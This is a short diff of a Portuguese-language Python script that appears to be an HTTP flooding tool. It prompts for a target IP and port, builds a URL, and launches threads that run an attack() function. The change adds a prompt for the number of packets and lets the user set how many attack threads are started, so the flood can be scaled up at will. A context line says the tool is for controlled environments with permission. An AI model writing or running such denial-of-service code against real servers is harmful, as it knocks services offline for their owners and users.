@@ -36,6 +36,7 @@ exclusivamente em ambientes controlados e com permissão.
 # Entrada do usuário para o alvo e porta
 alvo_ip = str(input("Insira o IP do Alvo: "))
 alvo_port = int(input("Insira a porta: "))
+numero = int(input("Número de pacotes: "))
 
 # Construção da URL
 target_url = f"http://{alvo_ip}:{alvo_port}"
@@ -49,8 +50,8 @@ def attack():
             print(f"{RED}[ERROR]{RESET}{NEON_PURPLE} {e}{RESET}")
 
 # Número de threads
-num_threads = 1 # Ajuste conforme necessário
+# Ajuste conforme necessário
 
-for _ in range(num_threads):
+for _ in range(numero):
     thread = threading.Thread(target=attack)
     thread.start()
